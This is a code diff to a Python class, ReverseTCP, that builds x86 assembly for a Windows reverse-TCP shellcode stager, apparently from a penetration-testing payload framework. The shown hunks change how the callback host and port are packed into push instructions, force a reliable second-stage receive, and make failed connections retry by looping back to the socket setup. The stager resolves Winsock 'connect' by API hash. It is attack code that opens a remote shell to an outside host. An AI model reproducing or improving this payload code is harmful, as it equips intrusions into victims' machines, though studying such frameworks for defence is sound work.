@@ -110,7 +110,7 @@ class ReverseTCP(BaseMixin):
 
         {self.block_recv(
             length=self.length.value,
-            reliable=self.reliable.value,
+            reliable=True,
             exit=self.exitfunc.value)}
         """)
 
@@ -127,8 +127,8 @@ class ReverseTCP(BaseMixin):
         :return str: block
         """
 
-        host = "0x%08x" % Socket().host(host)
-        port = "0x%08x" % Socket().port(port)
+        host = Socket().pack_host(host)
+        port = Socket().pack_port(port)
 
         block = dedent(f"""\
         reverse_tcp:
@@ -149,8 +149,8 @@ class ReverseTCP(BaseMixin):
             push {str(retries)}
 
         socket:
-            push {host}
-            push {port}
+            push 0x{host.hex()}
+            push 0x{port.hex()}0002
             mov  esi, esp
 
             push eax
@@ -168,7 +168,7 @@ class ReverseTCP(BaseMixin):
 
         block += dedent(f"""\
         connect:
-            push 16
+            push 0x10
             push esi
             push edi
             push {self.text.block_api_hash('ws2_32.dll', 'connect')}
@@ -275,7 +275,7 @@ class ReverseTCP(BaseMixin):
                 pop esi
                 dec dword ptr [esp]
 
-                jnz cleanup
+                jnz socket
                 jmp fail
             """)
 
